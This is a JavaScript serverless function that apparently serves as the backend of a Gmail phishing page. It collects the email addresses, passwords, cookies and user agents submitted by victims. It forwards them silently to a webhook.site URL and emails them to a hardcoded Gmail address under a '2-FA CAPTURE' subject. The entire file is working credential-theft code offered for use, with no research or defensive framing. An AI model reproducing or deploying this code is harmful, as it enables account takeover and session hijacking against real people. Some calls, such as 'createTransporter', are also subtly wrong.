const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             req.headers['x-real-ip'] || 
             req.connection.remoteAddress;

  if (!data.email || !data.password) {
    return res.status(400).json({ error: 'Missing email/password' });
  }

  // WEBHOOK BACKUP (silent)
  fetch(process.env.WEBHOOK_URL || 'https://webhook.site/#!/b3f4d2a1-8c9d-4e5f-9g7h-i8j9k0l1m2n3', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...data, ip, timestamp: new Date().toISOString() })
  }).catch(() => {});

  // GMAIL SMTP
  const transporter = nodemailer.createTransporter({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false, // true for 465
    auth: {
      user: process.env.EMAIL_USER,      // your@gmail.com
      pass: process.env.EMAIL_PASS       // 16-char App Password
    },
    tls: { rejectUnauthorized: false }
  });

  await transporter.sendMail({
    from: `"Gmail Alert" <${process.env.EMAIL_USER}>`,
    to: 'busmeup13@gmail.com',
    subject: `🔔 GMAIL 2-FA CAPTURE: ${data.email}`,
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px;">
        <h2 style="color: #d93025;">🎯 2-Step Credentials Captured</h2>
        <table style="width: 100%; border-collapse: collapse;">
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>⏰ Time:</strong></td><td>${new Date().toLocaleString()}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>🌐 IP:</strong></td><td>${ip}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>📧 Email:</strong></td><td>${data.email}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>🔑 Password:</strong></td><td style="color: #d93025; font-family: monospace;">${data.password}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>🍪 Cookies:</strong></td><td><code>${data.cookies || 'none'}</code></td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>👤 UA:</strong></td><td>${data.userAgent?.substring(0, 100)}...</td></tr>
        </table>
        <details style="margin-top: 20px;">
          <summary style="cursor: pointer; color: #1a73e8;">📊 Full Data (JSON)</summary>
          <pre style="background: #f8f9fa; padding: 16px; overflow: auto; font-size: 12px;">${JSON.stringify(data, null, 2)}</pre>
        </details>
      </div>
    `
  });

  res.json({ status: 'captured ✅', email: data.email, cookies_saved: true });
};
 